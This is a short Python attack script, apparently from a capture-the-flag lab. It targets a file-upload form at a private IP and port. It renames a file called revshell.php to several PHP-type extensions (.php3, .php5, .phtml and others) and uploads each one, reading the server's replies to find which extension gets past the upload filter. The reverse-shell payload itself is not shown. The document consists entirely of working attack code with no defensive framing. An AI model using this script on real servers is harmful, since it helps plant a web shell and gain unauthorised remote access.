#!/usr/bin/python3

import requests
import os

phpext = [
'.php',
'.php3',
'.php4',
'.php5',
'.phtml',
]

url = "http://10.10.245.24:3333/internal/index.php"

filename = "revshell"
old_filename = 'revshell.php'

for ext in phpext:
	file = filename + ext
	os.rename(old_filename, file)
	files = { "file" : open(file, 'rb')}
	r = requests.post(url, files=files)

	if "Extension not allowed" in r.text:
		print( ext + " not allowed")
	else:
		print(ext + " is allowed")

	old_filename = file

